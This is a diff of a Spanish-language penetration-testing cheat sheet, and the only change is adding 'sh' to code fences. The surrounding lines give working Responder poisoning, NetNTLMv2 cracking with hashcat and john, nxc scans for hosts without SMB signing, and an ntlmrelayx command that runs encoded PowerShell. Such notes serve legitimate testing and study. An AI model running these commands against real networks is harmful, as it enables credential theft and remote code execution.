@@ -26,7 +26,7 @@ Sin firma → relay (no depende de romper). Todo firmado → solo queda capturar
 
 ## 1. Envenenar y capturar — Responder
 
-```
+```sh
 # escuchar y responder a LLMNR/NBT-NS/mDNS
 responder -I eth0 -wv
 
@@ -40,7 +40,7 @@ Desactivar SMB y HTTP de Responder cuando se va a hacer relay (para no capturar 
 
 ## 2. Romper el NetNTLMv2
 
-```
+```sh
 hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
 john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
 ```
@@ -49,7 +49,7 @@ john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
 
 ## 3. Comprobar la firma — el prerrequisito del relay
 
-```
+```sh
 nxc smb 10.0.0.0/24 --gen-relay-list objetivos.txt   # lista los que NO firman
 nxc smb 10.0.0.0/24 | grep -i "signing:False"
 nxc ldap 10.0.0.10 -u '' -p '' -M ldap-checker        # firma/binding de LDAP
@@ -59,7 +59,7 @@ Solo los que no firman son objetivos de relay.
 
 ## 4. Retransmitir — ntlmrelayx
 
-```
+```sh
 # relay a SMB, ejecutar un comando
 ntlmrelayx.py -tf objetivos.txt -smb2support -c 'powershell -enc ...'
 
